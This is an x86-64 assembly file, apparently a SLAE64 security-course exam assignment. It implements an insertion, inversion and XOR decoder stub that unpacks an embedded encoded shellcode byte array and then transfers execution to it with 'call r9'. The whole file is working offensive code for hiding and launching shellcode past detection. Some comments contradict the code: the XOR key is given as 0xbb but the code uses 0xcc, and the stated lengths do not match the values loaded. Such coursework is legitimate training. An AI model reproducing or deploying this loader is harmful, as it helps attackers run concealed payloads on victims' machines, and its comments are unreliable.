

;Exam Assignment 4
;Insertion Decoder
;Decode Shellcode encoded
;by the "Invertion_Insertion_Xor_encoder"
;Christophe G SLAE64 - 1337









global _start


_start:


jmp short Address
                   ; insertion decoder , Insertion Decode  replace byte of the shellcode correctly ("remove" inserted dummy bytes);
                   ;don' t forget all bytes is inversed the "dummy bytes" is in first after this loop


            InsertionDecoder:
                 pop rsi
                 xor rbx , rbx
                 xor rcx , rcx
                 lea rdi , [rsi + 1]
                 mov r9 , rsi                                ; store for RDI later

            InsertionDecode:
                 cmp byte [rdi + rax + 1] , 0xff             ; marker byte
                 jz Invdecoder
                 mov bl , byte [rdi + rax]
                 mov byte [rsi] , bl
                 add al , 0x2
                 inc rsi
                 jmp InsertionDecode


                  ; invertion decoder/decode replace the shellcode bytes correctly , dummy bytes go to the end

            Invdecoder:
                 mov rdi , r9
                 xor rbx , rbx
                 mov bl , 0x1f                              ;     len of the shellcode - 1 (in this case 32 - 1)
                 mov cl , 0x10                              ;     len of shellcode / 2 ,  lower round example if len of the shellcode == 33 , 33 / 2 = 16.5 -->
                                                            ;round to 16 == 0x10 if not correctly set this value
							    ;decodeur don't work (marker byte <<0xff>> issue , take a marker byte and move it in beginning)

                 xor rdx , rdx



            Invdecode:
                  mov dl , byte [rdi]
                  mov al , byte [rdi + rbx]
                  mov byte [rdi] , al
                  mov byte [rdi + rbx] ,  dl
                  dec bl
                  dec bl                        ; dec rbx 2 times don' t forget is a offset , if decreasing 1 time rbx "don' t move" because rdi is increasing
                  inc rdi
               loop Invdecode

            ;Xordecoder / xordecode ; unxor shellcode bytes with 0xbb


            Xordecoder:
                  mov rdi , r9
                  add cl , 0x22                             ; len of shellcode

            Xordecode:
                  xor byte[rdi] , 0xcc
                  inc rdi
                  loop Xordecode

               call r9                ; pass control to shellcode



         Address:
            call InsertionDecoder
                          shellcode : db 0x1d,0xc9,0x2f,0xc3,0x54,0xf7,0x08,0x0c,0xae,0x4f,0x53,0x84,0xa4,0x2a,0x4d,0x45,0x44,0x84\
                          ,0xd9,0x9b,0x48,0x2e,0x64,0x45,0xf3,0x84,0x9b,0x9c,0x34,0x2b,0x44,0x45,0x1c,0x84,0x4e,0x9f,0x36,0xa4,0x6d\
                          ,0xbf,0x3c,0xe3,0x48,0xe3,0x4d,0xa2,0x01,0xa5,0x70,0xae,0xdf,0xe3,0x12,0x77,0x7e,0x84,0x0e,0x9c,0x79,0x0c\
                          ,0x7f,0xfd,0x73,0x84,0x5c,0xff,0xff

